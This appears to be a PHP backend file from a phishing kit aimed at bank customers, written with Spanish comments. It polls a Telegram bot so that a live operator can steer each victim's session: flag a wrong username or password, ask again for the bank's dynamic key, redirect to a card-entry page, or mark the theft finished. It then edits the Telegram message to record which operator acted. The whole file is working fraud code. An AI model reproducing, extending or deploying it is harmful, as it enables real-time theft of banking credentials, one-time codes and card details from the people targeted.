<?php
session_start();
header('Content-Type: application/json');

$config = require __DIR__ . '/../config.php';

$transactionId = $_POST['transactionId'] ?? '';
$messageId     = $_POST['messageId']     ?? '';

if (empty($transactionId) || empty($messageId)) {
    echo json_encode(['action' => null]);
    exit;
}

$botToken = $config['bot_token'] ?? '';
$chatId   = $config['chat_id']   ?? '';

if (!$botToken || !$chatId) {
    echo json_encode(['action' => null]);
    exit;
}

// Usar offset para evitar respuestas viejas
$offset = $_SESSION['last_update_id'] ?? 0;

$ch = curl_init("https://api.telegram.org/bot{$botToken}/getUpdates?offset=" . ($offset + 1));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

$data   = json_decode($response, true);
$action = null;

foreach ($data['result'] ?? [] as $update) {
    if (isset($update['update_id'])) {
        $_SESSION['last_update_id'] = $update['update_id'];
    }

    if (!isset($update['callback_query'])) {
        continue;
    }

    $callback = $update['callback_query'];
    $cbData   = $callback['data'] ?? '';

    if (strpos($cbData, $transactionId) === false) {
        continue;
    }

    list($actionType, ) = explode(':', $cbData, 2);
    $action = $actionType;

    // 1) Mensaje original
    $msg        = $callback['message'] ?? [];
    $origText   = $msg['text'] ?? '';
    $origChatId = $msg['chat']['id'] ?? $chatId;
    $origMsgId  = $msg['message_id'] ?? $messageId;

    // 2) Operador
    $from = $callback['from'] ?? [];
    if (!empty($from['username'])) {
        $operador = '@' . $from['username'];
    } else {
        $fn = $from['first_name'] ?? '';
        $ln = $from['last_name']  ?? '';
        $operador = trim($fn . ' ' . $ln);
        if ($operador === '') {
            $operador = 'Operador';
        }
    }

    // 3) Texto humano
    switch ($actionType) {
        case 'error_logo':
            $accionHumana = 'Usuario/Clave incorrectos (ERROR LOGO)';
            break;
        case 'pedir_dinamica':
            $accionHumana = 'Error de DINÁMICA / volver a pedir';
            break;
        case 'tarjeta':
            $accionHumana = 'Redirigir a TARJETA';
            break;
        case 'confirm_finalizar':
            $accionHumana = 'FINALIZÓ con dinámica correcta';
            break;
        default:
            $accionHumana = 'Acción desconocida';
            break;
    }

    // 4) Editar mensaje
    if ($origText !== '') {
        $newText  = $origText;
        $newText .= "\n\n————————————\n";
        $newText .= "✅ Acción: <b>{$accionHumana}</b>\n";
        $newText .= "👤 Operador: <b>{$operador}</b>";

        $editPayload = [
            'chat_id'      => $origChatId,
            'message_id'   => $origMsgId,
            'text'         => $newText,
            'parse_mode'   => 'HTML',
            'reply_markup' => json_encode(['inline_keyboard' => []])
        ];

        $chEdit = curl_init("https://api.telegram.org/bot{$botToken}/editMessageText");
        curl_setopt($chEdit, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($chEdit, CURLOPT_POST, true);
        curl_setopt($chEdit, CURLOPT_POSTFIELDS, json_encode($editPayload));
        curl_setopt($chEdit, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_exec($chEdit);
        curl_close($chEdit);
    }

    break;
}

echo json_encode(['action' => $action]);
